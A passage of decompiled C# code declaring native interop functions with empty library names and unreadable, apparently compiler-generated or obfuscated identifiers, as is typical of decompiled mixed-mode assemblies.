    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081\u00BE([In] uint obj0, [In] \u0081\u00BD* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int* \u0081\u00BB();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0081\u00B7();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int Ô(
      [In] int* obj0,
      [In] char*** obj1,
      [In] char*** obj2,
      [In] int obj3,
      [In] \u0081\u00B8* obj4);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe \u0082\u00BC* \u0081\u00AD([In] char* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081\u00A8([In] \u0081\u00BD* obj0);
  }
}
